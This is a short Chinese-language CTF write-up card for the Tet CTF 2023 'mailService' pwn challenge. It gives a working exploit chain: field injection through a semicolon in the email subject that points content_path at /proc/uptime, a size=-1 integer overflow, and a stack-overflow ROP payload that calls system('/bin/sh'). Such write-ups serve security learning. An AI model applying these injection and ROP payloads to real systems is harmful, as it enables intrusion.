---
title: "[CTF write up] Tet CTF 2023 – mailService : Logical bug & Mem corruption PWN"
category: web
tags: ["Tet CTF 2023", "web", "mail_service", "smtp_injection", "content_path_file_overwrite", "proc_uptime_leak"]
signals: ["Tet CTF 2023 2023", "mail_service", "smtp_injection", "content_path_file_overwrite", "proc_uptime_leak", "stack_overflow_mail_subject", "integer_overflow_size", "rop_pop_rdi_binsh_system", "mmap_libc_leak", "web_unknown", "Tet", "CTF", "mailService", "PWN"]
difficulty: hard
source: "https://www.ctfiot.com/90435.html"
tools: ["ROP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# [CTF write up] Tet CTF 2023 – mailService : Logical bug & Mem corruption PWN

> 赛事：Tet CTF 2023 2023 | 方向：web | 难度：hard | 工具：ROP

## 一句话总结

Tet CTF 2023 mailService PWN：发邮件主题注入 content_path=/proc/uptime 读内存 + size=-1 整数溢出 + 邮件内容 2048+ 字节栈溢出 ROP (pop rdi + /bin/sh + system)。

## 攻击链

1. 注册 xguest_random@hackemall.live → 登录 → 发邮件主题 'content_path=/proc/uptime\x00' * 70 注入文件名 → 收件人 xguest2 → 登录 xguest2 → 收件读邮件触发整数溢出 size=-1 → payload = 'a'*(2048+8) + p64(cnry) + p64(0xdeadbeef) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system) ROP

## 关键 payload

```
subject = b'xxxxxxxxxx' + b'aaaa;content_path=/proc/uptime\x00' * 70 / size = b'-1' / payload = b'a'*(2048+8) + p64(cnry) + p64(0xdeadbeef) + p64(libc_base+0x2a3e5) + p64(binsh) + p64(libc_base+0x2a3e5+1) + p64(libc_base+0x50d60)
```

## 经验教训

邮件主题字段含分号 ; 注入额外 HTTP header 头是经典 SSRF/LFI 攻击向量；size=-1 整数溢出到 2048+ 字节后跟 ROP 是 CTF PWN 标配。

## 标签

mail_service、smtp_injection、content_path_file_overwrite、proc_uptime_leak、stack_overflow_mail_subject、integer_overflow_size、rop_pop_rdi_binsh_system、mmap_libc_leak、pwn_mailclient

## 参考来源

- https://www.ctfiot.com/90435.html
- 原文件：[CTF_write_up]_Tet_CTF_2023_–_mailService_-_Logical_bug_&_Mem_corruption_PWN.full.md
